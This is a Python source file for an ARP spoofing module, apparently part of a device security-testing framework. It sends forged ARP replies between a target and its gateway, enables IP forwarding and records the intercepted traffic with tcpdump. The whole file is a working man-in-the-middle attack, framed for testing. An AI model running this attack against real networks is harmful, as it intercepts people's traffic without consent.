import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import*
from generic_attack import *
import logging
log = logging.getLogger(__name__)
from util import ioutil
import time
import platform

class ArpSpoof(GenericAttack):
    """ARP spoofing class
    """
    def __init__(self, attackName, attackConfig, deviceConfig):
        super(ArpSpoof, self).__init__(attackName, attackConfig, deviceConfig)


    def initialize(self, result):
        self.running = True
        self.respoofer(self.device["ip"], self.device["gateway-ip"])
        return

    def respoofer(self, targetIP, victim):
        """ Respoof the target every two seconds.
        """
        file_prefix = "arp";
        if ("file_prefix" in self.config.keys()):
            file_prefix = self.config["file_prefix"]

        filename = 'results/' + self.device['time'] + '/' + file_prefix + '.pcap'
        self.enable_packet_forwarding()
        if self.config['tcpdump']:
            global proc
            proc = subprocess.Popen(['tcpdump', 'host', targetIP, '-w',
                                  filename], stdout=subprocess.PIPE)
        try:
            while self.running:
                self.arpspoof(targetIP, victim)
                time.sleep(1)
            self.restoreARP(targetIP, victim)
            self.disable_packet_forwarding()
            self.terminateDump()
        except Exception, j:
            self.terminateDump()
            self.disable_packet_forwarding()
            self.restoreARP(targetIP, victim)



    # enables packet forwarding by interacting with the proc filesystem
    def enable_packet_forwarding(self):
        if platform.system() == "Darwin":
            os.system('sysctl -w net.inet.ip.forwarding=1 > /dev/null')
            os.system('sudo sysctl -w net.inet.ip.fw.enable=1 > /dev/null ')
        else:
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    # disables packet forwarding by interacting with the proc filesystem
    def disable_packet_forwarding(self):
        if platform.system() == "Darwin":
            os.system('sysctl -w net.inet.ip.forwarding=0 > /dev/null')
            os.system('sudo sysctl -w net.inet.ip.fw.enable=0 > /dev/null ')
        else:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    def arpspoof(self, gatewayIP, victimIP):
        victimMAC = ioutil.NetworkUtil.getMacbyIp(victimIP)
        gatewayMAC = ioutil.NetworkUtil.getMacbyIp(gatewayIP)
        send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=victimMAC))
        send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst=gatewayMAC))

    def restoreARP(self, gatewayIP, victimIP):
        victimMAC = ioutil.NetworkUtil.getMacbyIp(victimIP)
        gatewayMAC = ioutil.NetworkUtil.getMacbyIp(gatewayIP)
        send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=4)
        send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMAC), count=4)

    def terminateDump(self):
        if self.config['tcpdump']:
            global proc
            proc.terminate()
            #subprocess.Popen(['sudo', 'kill', '9', proc.pid])

    def shutdown(self):
        self.running = False
        return True

